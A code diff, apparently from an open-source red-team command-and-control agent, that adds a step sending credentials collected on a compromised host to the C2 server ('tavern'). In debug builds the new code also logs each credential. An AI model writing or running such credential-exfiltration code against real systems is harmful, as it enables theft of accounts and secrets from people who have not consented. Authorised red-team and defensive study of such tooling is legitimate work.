@@ -1,8 +1,8 @@
 use anyhow::Result;
 use c2::{
     pb::{
-        DownloadFileRequest, DownloadFileResponse, ReportProcessListRequest,
-        ReportTaskOutputRequest, TaskError, TaskOutput,
+        DownloadFileRequest, DownloadFileResponse, ReportCredentialRequest,
+        ReportProcessListRequest, ReportTaskOutputRequest, TaskError, TaskOutput,
     },
     Transport,
 };
@@ -90,6 +90,31 @@ impl TaskHandle {
                     }),
                 })
                 .await?;
+        }
+
+        // Report Credential
+        let credentials = self.runtime.collect_credentials();
+        for cred in credentials {
+            #[cfg(debug_assertions)]
+            log::info!("reporting credential (task_id={}): {:?}", self.id, cred);
+
+            match tavern
+                .report_credential(ReportCredentialRequest {
+                    task_id: self.id,
+                    credential: Some(cred),
+                })
+                .await
+            {
+                Ok(_) => {}
+                Err(_err) => {
+                    #[cfg(debug_assertions)]
+                    log::error!(
+                        "failed to report credential (task_id={}): {}",
+                        self.id,
+                        _err
+                    );
+                }
+            }
         }
 
         // Report Process Lists
